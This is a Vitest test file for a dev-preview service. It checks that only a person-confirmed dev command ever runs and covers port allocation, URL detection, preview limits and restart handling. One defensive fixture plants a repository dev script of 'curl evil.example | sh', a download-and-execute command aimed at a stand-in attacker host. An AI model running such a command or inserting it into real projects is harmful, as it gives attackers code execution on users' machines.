import { mkdirSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { ServiceError } from "../src/services/errors";
import { createPreviewEnv, type PreviewEnv, SETTINGS } from "./support/dev-preview-env";

let env: PreviewEnv;
beforeEach(() => {
  env = createPreviewEnv();
  env.addProject("app");
});
afterEach(() => env.close());

const refusal = async (run: Promise<unknown>): Promise<string> => {
  const error = await run.then(
    () => null,
    (e) => e,
  );
  expect(error).toBeInstanceOf(ServiceError);
  return (error as ServiceError).code;
};

/** Start a session's preview and let its dev command spawn. */
async function start(id: string, projectId = "app") {
  if (!env.sessions.has(id)) env.addSession(id, projectId);
  const state = await env.service.startSession(id);
  await Promise.resolve();
  return state;
}

describe("nothing runs until a person confirmed a command", () => {
  it("refuses to start a session's preview in a project with no confirmed command", async () => {
    env.addSession("s1", "app");
    expect(await refusal(env.service.startSession("s1"))).toBe("not_configured");
    expect(env.procs).toHaveLength(0);
    expect(env.service.sessionState("s1", false)).toMatchObject({
      status: "off",
      configured: false,
    });
  });

  it("never uses a command from the repository", async () => {
    const project = env.projects.get("app");
    if (!project) throw new Error("no project");
    // Everything a repository could offer: a dev script, the project file's dev server and
    // setup commands. None of it is a confirmed command.
    writeFileSync(
      join(project.path, "package.json"),
      JSON.stringify({ scripts: { dev: "curl evil.example | sh" } }),
    );
    writeFileSync(join(project.path, "pnpm-lock.yaml"), "lockfileVersion: 9\n");
    mkdirSync(join(project.path, ".codeden"));
    writeFileSync(
      join(project.path, ".codeden", "project.json"),
      JSON.stringify({ devServer: "repo-dev-server", setup: ["repo-setup"] }),
    );
    env.addSession("s1", "app");
    env.service.start();
    await env.service.tick();
    await env.service.idle();
    expect(await refusal(env.service.startSession("s1"))).toBe("not_configured");
    expect(env.procs).toHaveLength(0);
    // The suggestion is a fixed command chosen by the lockfile, not the script's text.
    expect(env.service.project("app", false)).toMatchObject({
      config: null,
      suggestion: { command: "pnpm dev" },
    });
    // Once a person confirms a command, that command runs and nothing else.
    await env.service.setProject("app", { ...SETTINGS, command: "my-confirmed-dev" });
    await start("s1");
    expect(env.procs.map((p) => p.spec.command)).toEqual(["my-confirmed-dev"]);
  });

  it("offers no suggestion to another device, and none once a command is set", async () => {
    const project = env.projects.get("app");
    writeFileSync(
      join(project?.path ?? "", "package.json"),
      JSON.stringify({ scripts: { dev: "x" } }),
    );
    expect(env.service.project("app", false).suggestion).toEqual({
      command: "npm run dev",
      reason: "package.json has a dev script",
    });
    expect(env.service.project("app", true).suggestion).toBeNull();
    await env.service.setProject("app", SETTINGS);
    expect(env.service.project("app", false).suggestion).toBeNull();
  });

  it("a changed command stops what runs, and a session's preview stays off until turned on", async () => {
    await env.service.setProject("app", SETTINGS);
    await start("s1");
    expect(env.running()).toHaveLength(1);
    await env.service.setProject("app", { ...SETTINGS, command: "other-dev" });
    expect(env.running()).toHaveLength(0);
    expect(env.service.sessionState("s1", false)).toMatchObject({
      status: "stopped",
      message: expect.stringContaining("settings changed"),
    });
    await env.service.tick();
    expect(env.procs).toHaveLength(1);
    await start("s1");
    expect(env.procs.at(-1)?.spec.command).toBe("other-dev");
  });

  it("a stored entry this build can't read counts as never confirmed", async () => {
    writeFileSync(
      join(env.home, "dev-preview.json"),
      JSON.stringify({ projects: { app: { command: "sneaky" } } }),
    );
    const service = env.restart();
    env.addSession("s1", "app");
    expect(await refusal(service.startSession("s1"))).toBe("not_configured");
    expect(env.procs).toHaveLength(0);
  });

  it("removing the project's preview stops everything and nothing can start again", async () => {
    await env.service.setProject("app", SETTINGS);
    await start("s1");
    await env.service.removeProject("app");
    expect(env.running()).toHaveLength(0);
    expect(await refusal(env.service.startSession("s1"))).toBe("not_configured");
  });
});

describe("what the command gets", () => {
  it("runs in the session's worktree with the ports in its environment and loopback as host", async () => {
    await env.service.setProject("app", {
      ...SETTINGS,
      command: "serve --port {port} --api {port2}",
      portVars: ["PORT", "API_PORT"],
    });
    process.env.CODEDEN_HOME = "/somewhere/private";
    process.env.GIT_DIR = "/a/hook/repo";
    try {
      const state = await start("s1");
      const [proc] = env.procs;
      expect(proc?.spec.cwd).toBe(env.sessions.get("s1")?.worktreePath);
      expect(state.ports).toEqual([43100, 43101]);
      expect(proc?.spec.command).toBe("serve --port 43100 --api 43101");
      expect(proc?.spec.env).toMatchObject({ PORT: "43100", API_PORT: "43101", HOST: "127.0.0.1" });
      expect(Object.keys(proc?.spec.env ?? {}).filter((k) => /^CODEDEN_/i.test(k))).toEqual([]);
      expect(proc?.spec.env.GIT_DIR).toBeUndefined();
    } finally {
      delete process.env.CODEDEN_HOME;
      delete process.env.GIT_DIR;
    }
  });

  it("never hands out the app's ports or a port something else holds", async () => {
    env.store.setLimits({ perProject: 3, total: 6, portFrom: 4310, portTo: 4420 });
    env.taken.add(4311);
    env.service.start({ port: 4312 });
    await env.service.setProject("app", {
      ...SETTINGS,
      portVars: ["A_PORT", "B_PORT", "C_PORT", "D_PORT"],
    });
    const first = await start("s1");
    expect(first.ports).toEqual([4310, 4313, 4314, 4315]);
    // A second preview gets none of the first one's ports.
    const second = await start("s2");
    expect(second.ports.some((p) => first.ports.includes(p))).toBe(false);
    for (const port of [4317, 4318, 4319, 4417, 4312, 4311]) {
      expect([...first.ports, ...second.ports]).not.toContain(port);
    }
    // Walk the whole range: the reserved ports are skipped every time round.
    for (let i = 0; i < 40; i++) {
      await env.service.stopSession("s2");
      const again = await start("s2");
      expect(again.ports).not.toContain(4317);
      expect(again.ports).not.toContain(4417);
    }
  });

  it("refuses when the range has no free port left", async () => {
    env.store.setLimits({ perProject: 3, total: 6, portFrom: 43100, portTo: 43107 });
    for (let port = 43100; port <= 43107; port++) env.taken.add(port);
    await env.service.setProject("app", SETTINGS);
    env.addSession("s1", "app");
    expect(await refusal(env.service.startSession("s1"))).toBe("no_ports");
    expect(env.procs).toHaveLength(0);
  });
});

describe("the link", () => {
  it("shows only once something listens on the port", async () => {
    await env.service.setProject("app", SETTINGS);
    await start("s1");
    env.procs[0]?.print("ready on http://localhost:43100\n");
    await env.service.tick();
    expect(env.service.sessionState("s1", false)).toMatchObject({ status: "starting", url: null });
    env.listening.add(43100);
    await env.service.tick();
    expect(env.service.sessionState("s1", false)).toMatchObject({
      status: "running",
      url: "http://localhost:43100",
    });
  });

  it("takes the first local URL the command prints, when asked to, and still probes it", async () => {
    await env.service.setProject("app", { ...SETTINGS, urlFrom: "output" });
    await start("s1");
    env.listening.add(43100);
    await env.service.tick();
    expect(env.service.sessionState("s1", false).status).toBe("starting");
    env.procs[0]?.print("  Network: http://192.168.1.20:5199/\n  Docs: https://example.com\n");
    env.procs[0]?.print("  \u001b[32mLocal\u001b[0m:   http://localhost:5199/app\n");
    await env.service.tick();
    expect(env.service.sessionState("s1", false).status).toBe("starting");
    env.listening.add(5199);
    await env.service.tick();
    expect(env.service.sessionState("s1", false)).toMatchObject({
      status: "running",
      url: "http://localhost:5199/app",
    });
  });

  it("fails a dev command nothing ever listens for", async () => {
    await env.service.setProject("app", SETTINGS);
    await start("s1");
    env.procs[0]?.print("compiling…\n");
    env.clock.now += 61_000;
    await env.service.tick();
    const state = env.service.sessionState("s1", false);
    expect(state).toMatchObject({ status: "failed", url: null });
    expect(state.message).toMatch(/Nothing was listening on port 43100/);
    expect(state.logTail).toContain("compiling…");
    expect(env.procs[0]?.stopped).toBe(true);
  });
});

describe("limits", () => {
  beforeEach(async () => {
    env.store.setLimits({ perProject: 2, total: 3, portFrom: 43100, portTo: 43199 });
    await env.service.setProject("app", SETTINGS);
  });

  it("stops the oldest idle preview to make room, with a notice", async () => {
    await start("s1");
    env.clock.now += 1000;
    await start("s2");
    env.clock.now += 1000;
    const third = await start("s3");
    expect(third.status).toBe("starting");
    expect(env.service.sessionState("s1", false)).toMatchObject({
      status: "stopped",
      message: expect.stringContaining("Stopped to make room"),
    });
    expect(env.service.sessionState("s2", false).status).toBe("starting");
    expect(env.running()).toHaveLength(2);
  });

  it("spares a session that is working, and refuses when all of them are", async () => {
    await start("s1");
    env.clock.now += 1000;
    await start("s2");
    env.sessions.set("s1", { ...env.addSession("s1", "app"), status: "running" });
    await start("s3");
    expect(env.service.sessionState("s1", false).status).toBe("starting");
    expect(env.service.sessionState("s2", false).status).toBe("stopped");
    env.sessions.set("s3", { ...env.addSession("s3", "app"), status: "running" });
    env.addSession("s4", "app");
    expect(await refusal(env.service.startSession("s4"))).toBe("limit_reached");
    expect(env.running()).toHaveLength(2);
  });

  it("counts previews in all projects against the total", async () => {
    env.addProject("web");
    env.addProject("api");
    await env.service.setProject("web", SETTINGS);
    await env.service.setProject("api", SETTINGS);
    await start("a1", "app");
    env.clock.now += 1000;
    await start("w1", "web");
    env.clock.now += 1000;
    await start("w2", "web");
    env.clock.now += 1000;
    await start("p1", "api");
    expect(env.running()).toHaveLength(3);
    expect(env.service.sessionState("a1", false).status).toBe("stopped");
  });

  it("two starts at once can't take the same slot or port", async () => {
    env.store.setLimits({ perProject: 1, total: 3, portFrom: 43100, portTo: 43199 });
    env.addSession("s1", "app");
    env.addSession("s2", "app");
    const [a, b] = await Promise.all([
      env.service.startSession("s1"),
      env.service.startSession("s2"),
    ]);
    expect(env.running()).toHaveLength(1);
    expect(a.ports).not.toEqual(b.ports);
  });
});

describe("when a preview stops", () => {
  beforeEach(async () => {
    await env.service.setProject("app", SETTINGS);
  });

  it.each([
    ["stopped", { status: "stopped" as const }, "The session is stopped."],
    ["failed", { status: "failed" as const }, "The session failed."],
    ["archived", { archivedAt: "2026-11-07T11:00:00.000Z" }, "The session is archived."],
    [
      "without its worktree",
      { worktreeRemovedAt: "2026-11-07T11:00:00.000Z" },
      expect.stringContaining("cleaned up"),
    ],
  ])("stops when its session is %s", async (_name, change, message) => {
    await start("s1");
    env.listening.add(43100);
    await env.service.tick();
    expect(env.service.sessionState("s1", false).status).toBe("running");
    const session = env.sessions.get("s1");
    if (!session) throw new Error("no session");
    env.sessions.set("s1", { ...session, ...change });
    await env.service.tick();
    expect(env.procs[0]?.stopped).toBe(true);
    expect(env.service.sessionState("s1", false)).toMatchObject({
      status: "stopped",
      url: null,
      message,
      unavailable: message,
    });
    expect(await refusal(env.service.startSession("s1"))).toBe("unavailable");
  });

  it("keeps running while the agent works and the session goes idle and busy again", async () => {
    await start("s1");
    for (const status of ["running", "waiting", "idle", "completed", "interrupted"] as const) {
      const session = env.sessions.get("s1");
      if (session) env.sessions.set("s1", { ...session, status });
      await env.service.tick();
      expect(env.running()).toHaveLength(1);
    }
  });

  it("stops every preview when the app closes", async () => {
    env.service.start();
    await start("s1");
    await start("s2");
    await env.service.stop();
    expect(env.procs.every((p) => p.stopped)).toBe(true);
    expect(env.service.sessionState("s1", false).status).toBe("off");
  });

  it("Stop all stops everything and says how many", async () => {
    await start("s1");
    await start("s2");
    expect(await env.service.stopAll()).toEqual({ stopped: 2, failed: [] });
    expect(env.running()).toHaveLength(0);
  });

  it("restarts a dev command that exits once, and never a second time", async () => {
    await start("s1");
    env.listening.add(43100);
    await env.service.tick();
    env.procs[0]?.exit(1);
    await env.procs[0]?.exited;
    await Promise.resolve();
    expect(env.procs).toHaveLength(2);
    expect(env.service.sessionState("s1", false)).toMatchObject({
      status: "starting",
      message: expect.stringContaining("restarted once"),
    });
    await env.service.tick();
    expect(env.service.sessionState("s1", false).status).toBe("running");
    env.procs[1]?.print("boom\n");
    env.procs[1]?.exit(2);
    await env.procs[1]?.exited;
    await Promise.resolve();
    for (let i = 0; i < 5; i++) await env.service.tick();
    expect(env.procs).toHaveLength(2);
    const state = env.service.sessionState("s1", false);
    expect(state).toMatchObject({ status: "stopped", url: null });
    expect(state.message).toBe("The dev command exited with code 2.");
    expect(state.logTail).toContain("boom");
    // A person's restart gets a fresh retry.
    await start("s1");
    expect(env.procs).toHaveLength(3);
  });

  it("a dev command that never came up fails after its one retry", async () => {
    await start("s1");
    env.procs[0]?.exit(127);
    await env.procs[0]?.exited;
    await Promise.resolve();
    env.procs[1]?.exit(127);
    await env.procs[1]?.exited;
    await Promise.resolve();
    expect(env.procs).toHaveLength(2);
    expect(env.service.sessionState("s1", false)).toMatchObject({
      status: "failed",
      message: "The dev command exited with code 127 before anything was listening.",
    });
  });
});
